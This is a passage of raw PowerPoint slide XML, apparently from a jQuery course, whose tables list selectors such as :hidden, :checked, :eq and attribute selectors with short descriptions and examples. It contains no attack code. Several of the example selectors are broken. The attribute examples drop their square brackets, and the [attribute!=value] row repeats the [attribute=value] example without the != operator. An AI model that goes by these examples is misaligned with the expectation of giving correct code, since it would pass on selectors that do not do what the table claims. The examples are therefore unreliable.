                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>element~sibling</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all siblings of an element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>ul~li</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:header</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all header type elements &lt;h1&gt;, &lt;h2&gt;, &lt;h3&gt;…</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(':header')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:focus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all elements, which have focus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(':focus')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10012"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370795">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:contains(text)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>all elements, which contain text</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(":contains('example')")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45714" marB="45714"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10013"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC5DEF40-2E07-433B-AB09-7622CFD05945}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>More jQuery Selectors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B7612DE-8474-4831-997F-309894AACA0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1389063"/>
          <a:ext cx="10972800" cy="5192712"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2246040">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5256584">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3470176">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Selector</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:hidden</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All hidden elements</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>div:hidden</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:visible</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All visible elements</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>div:visible</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, which have attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('[</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>href</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>]')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute=value]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, where attribute has given value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("width='300'")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute!=value]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, where attribute doesn't have given value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("width='300'")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute^=value]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, which start with given value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>href</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>^='https'")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute$=value]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, which end with given value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>src</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$='.jpg'")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>[attribute*=value]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements, which containing text value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("title*='hello'")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:selected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements which have been selected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(":selected")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:checked</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="4572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All elements which have been checked</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(":checked")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>selector1, selector2</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Any of the selectors</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("p, div")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:eq(index)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>index:nth</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> element of a list (indexes start from 0)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$("ul </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>li:eq</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(2)")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10012"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370908">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>:checkbox</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>All elements which checkbox type</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$(":checkbox")</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45728" marB="45728"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10013"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{825270CF-74F9-449F-B30E-FEE0B6D8493C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery DOM Traversal Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0469E739-BF72-45F3-A77E-D218DA59ECAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1497325715"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="4525965"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
